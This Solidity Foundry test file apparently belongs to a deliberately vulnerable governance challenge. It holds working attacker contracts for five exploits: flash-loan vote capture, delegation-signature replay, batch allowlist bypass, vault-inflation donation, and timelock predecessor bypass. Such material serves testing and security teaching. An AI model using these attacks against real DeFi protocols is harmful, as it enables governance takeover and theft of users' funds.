// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Setup.sol";
import "../src/GovToken.sol";
import "../src/Governor.sol";
import "../src/FlashLender.sol";
import "../src/Throne.sol";
import "../src/StakingVault.sol";
import "../src/Timelock.sol";

// Helper: arbitrary crown call data
function crownCall(address thr, address king, bytes memory tag) pure returns (bytes memory) {
    return abi.encodeWithSignature("crown(address,bytes)", king, tag);
}

contract TreasuryTest is Test {
    Setup public ctx;
    GovToken public token;
    FlashLender public lender;
    Governor public gov;
    Throne public throne;
    StakingVault public vault;
    Timelock public timelock;

    address public admin = address(0xAD);
    address public attacker = address(0xA7);
    address public d4Helper = address(0xD4);
    bytes public TAG = "team-test";

    uint256 botKey = 0xB07;
    address botAddr;

    function setUp() public {
        ctx = new Setup(admin, d4Helper);
        token = ctx.token();
        lender = ctx.lender();
        gov = ctx.governor();
        throne = ctx.throne();
        vault = ctx.vault();
        timelock = ctx.timelock();

        botAddr = vm.addr(botKey);
        // distribute BOT_SUPPLY from Setup to bot (mirrors entrypoint's setupBot call)
        vm.prank(admin);
        ctx.setupBot(botAddr);
        vm.prank(botAddr);
        token.delegate(botAddr);

        uint256 expiry = type(uint40).max;
        bytes32 structHash = keccak256(abi.encode(
            token.DELEGATION_TYPEHASH(),
            attacker,
            uint256(0),
            expiry
        ));
        bytes32 digest = keccak256(abi.encodePacked(
            "\x19\x01",
            token.DOMAIN_SEPARATOR(),
            structHash
        ));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(botKey, digest);

        vm.prank(admin);
        ctx.setBotSig(botAddr, attacker, 0, expiry, v, r, s);
    }

    // --- D1: flash loan live votes ---

    function testD1_FlashLoanVotes() public {
        vm.startPrank(attacker);

        D1Attacker atk = new D1Attacker(token, lender, gov, throne, TAG);
        atk.attack(gov.epochNonce());

        assertEq(throne.king(), address(atk), "D1: not king");
        vm.stopPrank();
    }

    // --- D2: delegation replay ---

    function testD2_DelegationReplay() public {
        uint256 expiry = ctx.botDelegateExpiry();
        uint8 v = ctx.botDelegatev();
        bytes32 r = ctx.botDelegater();
        bytes32 s = ctx.botDelegates();

        // replay the bot's published sig to direct bot's votes to attacker
        vm.prank(attacker);
        token.delegateBySig(attacker, 0, expiry, v, r, s);

        assertEq(token.getVotes(attacker), 600_000 ether, "D2: votes not transferred");

        // now attacker passes governance alone (600_000 > quorum 500_001)
        vm.startPrank(attacker);
        uint256 epoch = gov.epochNonce();
        uint256 pid = gov.propose(address(throne), crownCall(address(throne), attacker, TAG), epoch);
        gov.castVote(pid);
        gov.execute(pid);
        vm.stopPrank();

        assertEq(throne.king(), attacker, "D2: not king");
    }

    // D3: cannot propose a batch with crown() at targets[0] directly
    function testD3_DirectCrownBlocked() public {
        // make attacker have votes so we can try proposing
        deal(address(token), attacker, 600_000 ether);
        vm.prank(attacker);
        token.delegate(attacker);

        vm.startPrank(attacker);
        address[] memory targets = new address[](1);
        bytes[] memory data = new bytes[](1);
        targets[0] = address(throne);
        data[0] = crownCall(address(throne), attacker, TAG);
        uint256 epoch = gov.epochNonce();   // cache BEFORE expectRevert
        vm.expectRevert("need >= 2 targets");
        gov.proposeBatch(targets, data, epoch);
        vm.stopPrank();
    }

    // D2: nonce is NOT incremented, so the same sig works a second time
    function testD2_ReplayAgain() public {
        uint256 expiry = ctx.botDelegateExpiry();
        uint8 v = ctx.botDelegatev();
        bytes32 r = ctx.botDelegater();
        bytes32 s = ctx.botDelegates();

        // first replay
        vm.prank(attacker);
        token.delegateBySig(attacker, 0, expiry, v, r, s);

        // epoch rotate simulates round reset (storage reverts on-chain, but the sig stays valid)
        vm.prank(admin);
        gov.rotateEpoch();

        // second replay -- nonce is still 0 (never incremented)
        vm.prank(attacker);
        token.delegateBySig(attacker, 0, expiry, v, r, s);

        assertEq(token.getVotes(attacker), 600_000 ether, "D2: replay failed second time");
    }

    // --- D3: batch target bypass ---

    function testD3_BatchTargetBypass() public {
        vm.startPrank(attacker);
        D3Attacker atk = new D3Attacker(token, lender, gov, throne, ctx.safeTarget(), TAG);
        atk.attack(gov.epochNonce());
        vm.stopPrank();

        assertEq(throne.king(), address(atk), "D3: not king");
    }

    // --- D4: vault inflation ---

    function testD4_VaultInflation() public {
        // d4Helper has 1 wei token from setup (D4_SEED = 1)
        vm.startPrank(d4Helper);
        D4Attacker atk = new D4Attacker(token, lender, gov, throne, vault, TAG);
        token.transfer(address(atk), 1);  // 1 wei seed
        uint256 epoch = gov.epochNonce();
        atk.attack(epoch);
        vm.stopPrank();

        assertEq(throne.king(), address(atk), "D4: not king");
    }

    // D4: second depositor after inflation gets 0 shares
    // First depositor puts in 1 wei -> 1 share. Donation inflates totalAssets to 500_001 ether.
    // Any deposit < 500_001 ether gets 0 shares (rounds down).
    function testD4_SecondDepositorGetsZeroShares() public {
        address other = address(0xBEEF);
        deal(address(token), attacker, 1);          // 1 wei for seed
        deal(address(token), other, 500_000 ether);

        // attacker: first depositor (1 wei -> 1 share)
        vm.startPrank(attacker);
        token.approve(address(vault), 1);
        vault.deposit(1, attacker);   // totalShares = 1, totalAssets = 1 wei
        // simulate flash-loan donation: deal sets vault balance to 500_001 ether
        deal(address(token), address(vault), 500_001 ether);
        vm.stopPrank();

        // second depositor: 500_000 ether -> shares = 500_000e18 * 1 / 500_001e18 = 0
        vm.startPrank(other);
        token.approve(address(vault), 500_000 ether);
        vm.expectRevert("zero shares -- vault inflated");
        vault.deposit(500_000 ether, other);
        vm.stopPrank();
    }

    // --- D5: timelock predecessor bypass ---

    function testD5_TimelockPredecessor() public {
        vm.startPrank(attacker);

        // schedule a crown batch with a fake/unexecuted predecessor
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory payloads = new bytes[](1);
        targets[0] = address(throne);
        values[0] = 0;
        payloads[0] = crownCall(address(throne), attacker, TAG);

        bytes32 fakePredecessor = keccak256("some-op-that-was-never-scheduled");
        bytes32 salt = bytes32(uint256(1));

        timelock.scheduleBatch(targets, values, payloads, fakePredecessor, salt, 0);

        // D5 BUG: executeBatch does NOT check that fakePredecessor is done.
        // In a correct Timelock, this would revert with "predecessor not done".
        timelock.executeBatch(targets, values, payloads, fakePredecessor, salt);

        vm.stopPrank();

        assertEq(throne.king(), attacker, "D5: not king");
    }

    // D5: with no predecessor (bytes32(0)), execution should always work
    function testD5_NoPredecessorAlwaysWorks() public {
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory payloads = new bytes[](1);
        targets[0] = address(throne);
        values[0] = 0;
        payloads[0] = crownCall(address(throne), attacker, TAG);

        bytes32 salt = bytes32(uint256(99));

        vm.prank(attacker);
        timelock.scheduleBatch(targets, values, payloads, bytes32(0), salt, 0);
        vm.prank(attacker);
        timelock.executeBatch(targets, values, payloads, bytes32(0), salt);

        assertEq(throne.king(), attacker, "D5: no-predecessor path failed");
    }

    // --- Reset restores clean state ---

    function testReset_ClearsThrone() public {
        // crown attacker via D5
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory payloads = new bytes[](1);
        targets[0] = address(throne);
        payloads[0] = crownCall(address(throne), attacker, TAG);
        vm.prank(attacker);
        timelock.scheduleBatch(targets, values, payloads, bytes32(0), bytes32(uint256(7)), 0);
        vm.prank(attacker);
        timelock.executeBatch(targets, values, payloads, bytes32(0), bytes32(uint256(7)));
        assertEq(throne.king(), attacker);

        // reset: abdicate throne, rotate epoch, reset vault
        vm.prank(admin);
        throne.abdicate();
        vm.prank(admin);
        gov.rotateEpoch();

        assertEq(throne.king(), address(0), "reset: throne not cleared");
    }

    function testReset_VaultEmptied() public {
        // inflate vault
        deal(address(token), attacker, 1 ether);
        vm.startPrank(attacker);
        token.approve(address(vault), 1 ether);
        vault.deposit(1 ether, attacker);
        vm.stopPrank();

        assertGt(vault.totalShares(), 0);

        // reset vault (admin sends assets to lender)
        vm.prank(admin);
        vault.reset(address(lender));

        assertEq(vault.totalShares(), 0, "reset: vault shares not cleared");
        assertEq(vault.totalAssets(), 0, "reset: vault assets not cleared");
    }
}

// --- Attack contracts ---

contract D1Attacker is IFlashBorrower {
    GovToken token;
    FlashLender lender;
    Governor gov;
    Throne throne;
    bytes tag;
    uint256 epoch;

    constructor(GovToken t, FlashLender l, Governor g, Throne thr, bytes memory _tag) {
        token = t; lender = l; gov = g; throne = thr; tag = _tag;
    }

    function attack(uint256 _epoch) external {
        epoch = _epoch;
        lender.flashLoan(lender.maxFlashLoan(), address(this), "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external override {
        require(msg.sender == address(lender));
        // D1: delegate flash-borrowed tokens to self -> live votes > quorum
        token.delegate(address(this));
        uint256 pid = gov.propose(address(throne), crownCall(address(throne), address(this), tag), epoch);
        gov.castVote(pid);
        gov.execute(pid);
        // repay
        token.transfer(address(lender), amount);
    }
}

contract D3Attacker is IFlashBorrower {
    GovToken token;
    FlashLender lender;
    Governor gov;
    Throne throne;
    SafeTarget safe;
    bytes tag;
    uint256 epoch;

    constructor(GovToken t, FlashLender l, Governor g, Throne thr, SafeTarget s, bytes memory _tag) {
        token = t; lender = l; gov = g; throne = thr; safe = s; tag = _tag;
    }

    function attack(uint256 _epoch) external {
        epoch = _epoch;
        lender.flashLoan(lender.maxFlashLoan(), address(this), "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external override {
        require(msg.sender == address(lender));
        token.delegate(address(this));

        // D3: batch with safe at [0] (allowlisted), crown at [1] (bypasses check)
        address[] memory targets = new address[](2);
        bytes[] memory data = new bytes[](2);
        targets[0] = address(safe);
        targets[1] = address(throne);
        data[0] = abi.encodeWithSignature("ping()");
        data[1] = crownCall(address(throne), address(this), tag);

        uint256 bid = gov.proposeBatch(targets, data, epoch);
        gov.castBatchVote(bid);
        gov.executeBatch(bid);

        token.transfer(address(lender), amount);
    }
}

contract D4Attacker is IFlashBorrower {
    GovToken token;
    FlashLender lender;
    Governor gov;
    Throne throne;
    StakingVault vault;
    bytes tag;
    uint256 epoch;
    uint256 seedAmt;

    constructor(GovToken t, FlashLender l, Governor g, Throne thr, StakingVault v, bytes memory _tag) {
        token = t; lender = l; gov = g; throne = thr; vault = v; tag = _tag;
    }

    function attack(uint256 _epoch) external {
        epoch = _epoch;
        seedAmt = token.balanceOf(address(this));   // 1 wei from d4Helper
        uint256 borrowAmt = 500_001 ether;
        lender.flashLoan(borrowAmt, address(this), "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external override {
        require(msg.sender == address(lender));
        // D4: first depositor (1 wei -> 1 share) + donation attack
        // 1. deposit seed (1 wei) -> 1 share (vault was empty)
        token.approve(address(vault), seedAmt);
        vault.deposit(seedAmt, address(this));
        // 2. donate flash-borrowed tokens -> vault.totalAssets = 500_001 ether + 1 wei
        token.transfer(address(vault), amount);
        // 3. getVotes = 500_002 ether > quorum (500_001)
        uint256 pid = gov.propose(address(throne), crownCall(address(throne), address(this), tag), epoch);
        gov.castVote(pid);    // vault votes + gGEN votes
        gov.execute(pid);
        // 4. redeem shares to recover tokens for repayment
        vault.redeem(address(this), address(this));
        // 5. repay flash loan
        token.transfer(address(lender), amount);
    }
}

